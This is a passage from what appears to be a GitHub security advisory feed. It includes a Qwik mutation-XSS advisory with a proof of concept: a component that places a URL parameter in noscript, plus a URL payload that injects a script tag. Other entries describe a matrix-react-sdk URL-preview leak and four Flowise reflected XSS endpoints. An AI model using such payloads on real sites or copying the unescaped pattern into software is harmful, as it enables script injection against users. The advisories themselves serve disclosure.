<li>Other characters -&gt; No conversion</li>
</ul>
</li>
<li>Otherwise:<ul>
<li><code>&lt;</code> -&gt; <code>&amp;lt;</code></li>
<li><code>&gt;</code> -&gt; <code>&amp;gt;</code></li>
<li><code>&amp;</code> -&gt; <code>&amp;amp;</code></li>
<li>Other characters -&gt; No conversion</li>
</ul>
</li>
</ul>
<p>It sometimes causes the situation that the final DOM tree rendered on browsers is different from what Qwik expects on server-side rendering. This may be leveraged to perform XSS attacks, and a type of the XSS is known as mXSS (mutation XSS).</p>
<h2 id="poc">PoC</h2>
<p>A vulnerable component:</p>
<pre><code class="language-javascript">import { component$ } from "@builder.io/qwik";
import { useLocation } from "@builder.io/qwik-city";

export default component$(() =&gt; {
  
  // user input
  const { url } = useLocation();
  const href = url.searchParams.get("href") ?? "https://example.com";

  return (
    &lt;div&gt;
      &lt;noscript&gt;
        &lt;a href={href}&gt;test&lt;/a&gt;
      &lt;/noscript&gt;
    &lt;/div&gt;
  );
});
</code></pre>
<p>If a user accesses the following URL,</p>
<pre><code>http://localhost:4173/?href=&lt;/noscript&gt;&lt;script&gt;alert(123)&lt;/script&gt;
</code></pre>
<p>then, <code>alert(123)</code> will be executed.</p>
<h3 id="impact">Impact</h3>
<p>XSS</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/QwikDev/qwik/security/advisories/GHSA-2rwj-7xq8-4gx4">https://github.com/QwikDev/qwik/security/advisories/GHSA-2rwj-7xq8-4gx4</a></li>
<li><a href="https://github.com/QwikDev/qwik/commit/7e742eb3a1001542d795776c0317d47df8b9d64e">https://github.com/QwikDev/qwik/commit/7e742eb3a1001542d795776c0317d47df8b9d64e</a></li>
<li><a href="https://github.com/QwikDev/qwik/blob/v1.5.5/packages/qwik/src/core/render/ssr/render-ssr.ts#L1182-L1208">https://github.com/QwikDev/qwik/blob/v1.5.5/packages/qwik/src/core/render/ssr/render-ssr.ts#L1182-L1208</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41677">https://nvd.nist.gov/vuln/detail/CVE-2024-41677</a></li>
<li><a href="https://github.com/advisories/GHSA-2rwj-7xq8-4gx4">https://github.com/advisories/GHSA-2rwj-7xq8-4gx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2rwj-7xq8-4gx4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-06T18:24:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[matrix-react-sdk] Matrix SDK for React's URL preview setting for a room is controllable by the homeserver]]></title>
        <id>https://github.com/advisories/GHSA-f83w-wqhc-cfp4</id>
        <link href="https://github.com/advisories/GHSA-f83w-wqhc-cfp4"/>
        <updated>2024-08-08T16:38:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious homeserver could manipulate a user's account data to cause the client to enable URL previews in end-to-end encrypted rooms, in which case any URLs in encrypted messages would be sent to the server.</p>
<p>Even if the CVSS score would be 4.1 (<a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N&amp;version=3.1">AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N</a>) the maintainer classifies this as High severity issue.</p>
<h3 id="patches">Patches</h3>
<p>This was patched in matrix-react-sdk 3.105.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Deployments that trust their homeservers, as well as closed federations of trusted servers, are not affected.</p>
<h3 id="references">References</h3>
<p>N/A.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-f83w-wqhc-cfp4">https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-f83w-wqhc-cfp4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42347">https://nvd.nist.gov/vuln/detail/CVE-2024-42347</a></li>
<li><a href="https://github.com/matrix-org/matrix-react-sdk/releases/tag/v3.105.1">https://github.com/matrix-org/matrix-react-sdk/releases/tag/v3.105.1</a></li>
<li><a href="https://github.com/advisories/GHSA-f83w-wqhc-cfp4">https://github.com/advisories/GHSA-f83w-wqhc-cfp4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f83w-wqhc-cfp4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-06T14:12:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise Cross-site Scripting in /api/v1/chatflows-streaming/id]]></title>
        <id>https://github.com/advisories/GHSA-858c-qxvx-rg9v</id>
        <link href="https://github.com/advisories/GHSA-858c-qxvx-rg9v"/>
        <updated>2024-08-05T21:29:30.000Z</updated>
        <content type="html"><![CDATA[<p>Flowise is a drag &amp; drop user interface to build a customized large language model flow. In version 1.4.3 of Flowise, a reflected cross-site scripting vulnerability occurs in the <code>/api/v1/chatflows-streaming/id</code> endpoint. If the default configuration is used (unauthenticated), an attacker may be able to craft a specially crafted URL that injects Javascript into the user sessions, allowing the attacker to steal information, create false popups, or even redirect the user to other websites without interaction. If the chatflow ID is not found, its value is reflected in the 404 page, which has type text/html. This allows an attacker to attach arbitrary scripts to the page, allowing an attacker to steal sensitive information. This XSS may be chained with the path injection to allow an attacker without direct access to Flowise to read arbitrary files from the Flowise server. As of time of publication, no known patches are available.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37145">https://nvd.nist.gov/vuln/detail/CVE-2024-37145</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L375-L375">https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L375-L375</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise">https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise</a></li>
<li><a href="https://github.com/advisories/GHSA-858c-qxvx-rg9v">https://github.com/advisories/GHSA-858c-qxvx-rg9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-858c-qxvx-rg9v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-05T21:29:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise Cross-site Scripting in/api/v1/credentials/id]]></title>
        <id>https://github.com/advisories/GHSA-wxm4-9f8p-gggv</id>
        <link href="https://github.com/advisories/GHSA-wxm4-9f8p-gggv"/>
        <updated>2024-08-05T21:29:30.000Z</updated>
        <content type="html"><![CDATA[<p>Flowise is a drag &amp; drop user interface to build a customized large language model flow. In version 1.4.3 of Flowise, a reflected cross-site scripting vulnerability occurs in the <code>/api/v1/credentials/id</code> endpoint. If the default configuration is used (unauthenticated), an attacker may be able to craft a specially crafted URL that injects Javascript into the user sessions, allowing the attacker to steal information, create false popups, or even redirect the user to other websites without interaction. If the chatflow ID is not found, its value is reflected in the 404 page, which has type text/html. This allows an attacker to attach arbitrary scripts to the page, allowing an attacker to steal sensitive information. This XSS may be chained with the path injection to allow an attacker without direct access to Flowise to read arbitrary files from the Flowise server. As of time of publication, no known patches are available.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37146">https://nvd.nist.gov/vuln/detail/CVE-2024-37146</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L545-L545">https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L545-L545</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise">https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise</a></li>
<li><a href="https://github.com/advisories/GHSA-wxm4-9f8p-gggv">https://github.com/advisories/GHSA-wxm4-9f8p-gggv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wxm4-9f8p-gggv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-05T21:29:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise Cross-site Scripting in api/v1/chatflows/id]]></title>
        <id>https://github.com/advisories/GHSA-2jch-qc96-9f5g</id>
        <link href="https://github.com/advisories/GHSA-2jch-qc96-9f5g"/>
        <updated>2024-08-05T21:29:29.000Z</updated>
        <content type="html"><![CDATA[<p>Flowise is a drag &amp; drop user interface to build a customized large language model flow. In version 1.4.3 of Flowise, a reflected cross-site scripting vulnerability occurs in the <code>api/v1/chatflows/id</code> endpoint. If the default configuration is used (unauthenticated), an attacker may be able to craft a specially crafted URL that injects Javascript into the user sessions, allowing the attacker to steal information, create false popups, or even redirect the user to other websites without interaction. If the chatflow ID is not found, its value is reflected in the 404 page, which has type text/html. This allows an attacker to attach arbitrary scripts to the page, allowing an attacker to steal sensitive information. This XSS may be chained with the path injection to allow an attacker without direct access to Flowise to read arbitrary files from the Flowise server. As of time of publication, no known patches are available.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36422">https://nvd.nist.gov/vuln/detail/CVE-2024-36422</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L312-L312">https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L312-L312</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise">https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise</a></li>
<li><a href="https://github.com/advisories/GHSA-2jch-qc96-9f5g">https://github.com/advisories/GHSA-2jch-qc96-9f5g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2jch-qc96-9f5g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-05T21:29:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise Cross-site Scripting in /api/v1/public-chatflows/id]]></title>
        <id>https://github.com/advisories/GHSA-fccx-2pwj-hrq7</id>
        <link href="https://github.com/advisories/GHSA-fccx-2pwj-hrq7"/>
        <updated>2024-08-05T21:29:29.000Z</updated>
        <content type="html"><![CDATA[<p>Flowise is a drag &amp; drop user interface to build a customized large language model flow. In version 1.4.3 of Flowise, a reflected cross-site scripting vulnerability occurs in the <code>/api/v1/public-chatflows/id</code> endpoint. If the default configuration is used (unauthenticated), an attacker may be able to craft a specially crafted URL that injects Javascript into the user sessions, allowing the attacker to steal information, create false popups, or even redirect the user to other websites without interaction. If the chatflow ID is not found, its value is reflected in the 404 page, which has type text/html. This allows an attacker to attach arbitrary scripts to the page, allowing an attacker to steal sensitive information. This XSS may be chained with the path injection to allow an attacker without direct access to Flowise to read arbitrary files from the Flowise server. As of time of publication, no known patches are available.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36423">https://nvd.nist.gov/vuln/detail/CVE-2024-36423</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L322-L322">https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L322-L322</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise">https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise</a></li>
<li><a href="https://github.com/advisories/GHSA-fccx-2pwj-hrq7">https://github.com/advisories/GHSA-fccx-2pwj-hrq7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fccx-2pwj-hrq7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-05T21:29:28.000Z</published>
    </entry>
</feed>